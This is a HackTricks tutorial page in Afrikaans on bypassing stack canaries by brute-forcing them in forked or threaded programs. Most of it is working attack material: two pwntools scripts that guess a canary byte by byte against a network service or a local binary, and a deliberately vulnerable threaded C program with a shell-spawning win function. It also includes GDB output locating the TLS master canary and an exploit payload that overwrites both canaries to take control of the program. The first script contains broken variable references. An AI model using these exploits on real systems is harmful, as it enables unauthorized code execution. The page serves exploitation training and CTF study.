# BF Forked & Threaded Stack Kanaries

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

**As jy te make het met 'n bin√™re beskerm deur 'n kanarie en PIE (Position Independent Executable) moet jy waarskynlik 'n manier vind om dit te omseil.**

![](<../../../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
Let daarop dat **`checksec`** dalk nie vind dat 'n bin√™re beskerm word deur 'n kanarie as dit staties saamgestel is en nie in staat is om die funksie te identifiseer nie.\
Jy kan egter handmatig hierdie opmerk as jy vind dat 'n waarde aan die begin van 'n funksieoproep in die stapel gestoor word en hierdie waarde nagegaan word voordat dit afsluit.
{% endhint %}

## Brute force Canary

Die beste manier om 'n eenvoudige kanarie te omseil is as die bin√™re 'n program is wat **kindprosesse vurk elke keer as jy 'n nuwe verbinding met dit vestig** (netwerkdienste), omdat elke keer as jy daarmee verbind **dieselfde kanarie gebruik sal word**.

Dan is die beste manier om die kanarie te omseil net om dit **karakter vir karakter te kragtig**, en jy kan uitvind of die gerate kanariebyte korrek was deur te kyk of die program afgesny het of sy gewone vloei voortset. In hierdie voorbeeld **kragtig die funksie 'n 8 Bytes kanarie (x64)** en onderskei tussen 'n korrek gerate byte en 'n slegte byte deur net **te kyk** of 'n **antwoord** terug gestuur word deur die bediener (op 'n ander manier in **ander situasies** kan 'n **try/except** gebruik word):

### Voorbeeld 1

Hierdie voorbeeld is ge√Ømplementeer vir 64-bits maar kan maklik ge√Ømplementeer word vir 32-bits.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Voorbeeld 2

Dit is ge√Ømplementeer vir 32 bits, maar dit kan maklik verander word na 64 bits.\
Merk ook op dat vir hierdie voorbeeld die **program verwag dat eerste 'n byte aandui wat die grootte van die inset** en die lading is.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Drade

Drade van dieselfde proses sal ook **die selfde kanarie-token deel**, daarom sal dit moontlik wees om 'n kanarie te **brute-force** as die bin√™re l√™er elke keer 'n nuwe draad skep wanneer 'n aanval plaasvind.

'n Buffer-oorvloei in 'n gedraadfunksie wat beskerm word met 'n kanarie kan gebruik word om die hoofkanarie van die proses te wysig. As gevolg hiervan is die mitigasie nutteloos omdat die kontrole met twee kanaries gebruik word wat dieselfde is (hoewel gewysig).

### Voorbeeld

Die volgende program is kwesbaar vir Buffer Oorvloei, maar dit is saamgestel met 'n kanarie:
```c
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

// gcc thread_canary.c -no-pie -l pthread -o thread_canary

void win() {
execve("/bin/sh", NULL, NULL);
}

void* vuln() {
char data[0x20];
gets(data);
}

int main() {
pthread_t thread;

pthread_create(&thread, NULL, vuln, NULL);
pthread_join(thread, NULL);

return 0;
}
```
Merk op dat `vuln` binne 'n draad aangeroep word. In GDB kan ons na `vuln` kyk, spesifiek op die punt waar die program `gets` aanroep om insetdata te lees:
```bash
gef> break gets
Breakpoint 1 at 0x4010a0
gef> run
...
gef> x/10gx $rdi
0x7ffff7d7ee20: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee30: 0x0000000000000000      0x0000000000000000
0x7ffff7d7ee40: 0x0000000000000000      0x493fdc653a156800
0x7ffff7d7ee50: 0x0000000000000000      0x00007ffff7e17ac3
0x7ffff7d7ee60: 0x0000000000000000      0x00007ffff7d7f640
```
Die bogenoemde verteenwoordig die adres van `data`, waar die program gebruikersinvoer sal skryf. Die stakannar is gevind by `0x7ffff7d7ee48` (`0x493fdc653a156800`), en die terugkeeradres is by `0x7ffff7d7ee50` (`0x00007ffff7e17ac3`):
```bash
gef> telescope $rdi 8 -n
0x7ffff7d7ee20|+0x0000|+000: 0x0000000000000000  <-  $rdi
0x7ffff7d7ee28|+0x0008|+001: 0x0000000000000000
0x7ffff7d7ee30|+0x0010|+002: 0x0000000000000000
0x7ffff7d7ee38|+0x0018|+003: 0x0000000000000000
0x7ffff7d7ee40|+0x0020|+004: 0x0000000000000000
0x7ffff7d7ee48|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7ee50|+0x0030|+006: 0x0000000000000000  <-  $rbp
0x7ffff7d7ee58|+0x0038|+007: 0x00007ffff7e17ac3 <start_thread+0x2f3>  ->  0xe8ff31fffffe6fe9  <-  retaddr[2]
```
Merk op dat die stakingsadres nie behoort aan die werklike stak nie:
```bash
gef> vmmap stack
[ Legend:  Code | Heap | Stack | Writable | ReadOnly | None | RWX ]
Start              End                Size               Offset             Perm Path
0x00007ffff7580000 0x00007ffff7d83000 0x0000000000803000 0x0000000000000000 rw- <tls-th1><stack-th2>  <-  $rbx, $rsp, $rbp, $rsi, $rdi, $r12
0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 0x0000000000000000 rw- [stack]  <-  $r9, $r15
```
Die stapel van die draad word bo die Draad Plaaslike Stoorplek (TLS) geplaas, waar die hoof kanarie gestoor word:
```bash
gef> tls
$tls = 0x7ffff7d7f640
...
---------------------------------------------------------------------------- TLS ----------------------------------------------------------------------------
0x7ffff7d7f640|+0x0000|+000: 0x00007ffff7d7f640  ->  [loop detected]  <-  $rbx, $r12
0x7ffff7d7f648|+0x0008|+001: 0x00000000004052b0  ->  0x0000000000000001
0x7ffff7d7f650|+0x0010|+002: 0x00007ffff7d7f640  ->  [loop detected]
0x7ffff7d7f658|+0x0018|+003: 0x0000000000000001
0x7ffff7d7f660|+0x0020|+004: 0x0000000000000000
0x7ffff7d7f668|+0x0028|+005: 0x493fdc653a156800  <-  canary
0x7ffff7d7f670|+0x0030|+006: 0xb79b79966e9916c4  <-  PTR_MANGLE cookie
0x7ffff7d7f678|+0x0038|+007: 0x0000000000000000
...
```
{% hint style="info" %}
Sommige van die bogenoemde GDB-funksies is gedefinieer op 'n uitbreiding genaamd [bata24/gef](https://github.com/bata24/gef), wat meer kenmerke as die gewone [hugsy/gef](https://github.com/hugsy/gef) het.
{% endhint %}

As gevolg hiervan kan 'n groot Buffer Overflow toelaat om beide die stakkanarie en die meesterkanarie in die TLS te wysig. Dit is die verskuiwing:
```bash
gef> p/x 0x7ffff7d7f668 - $rdi
$1 = 0x848
```
Dit is 'n kort uitbuiting om `wen` te roep:
```python
from pwn import *

context.binary = 'thread_canary'

payload  = b'A' * 0x28                    # buffer overflow offset
payload += b'BBBBBBBB'                    # overwritting stack canary
payload += b'A' * 8                       # saved $rbp
payload += p64(context.binary.sym.win)    # return address
payload += b'A' * (0x848 - len(payload))  # padding
payload += b'BBBBBBBB'                    # overwritting master canary

io = context.binary.process()
io.sendline(payload)
io.interactive()
```
## Ander voorbeelde & verwysings

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64-bits, geen PIE, nx, BF kanarie, skryf in 'n sekere geheue 'n ROP om `execve` te roep en spring daarheen.
* [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)
* 64-bits, geen PIE, nx, wysig draad en meester kanarie.
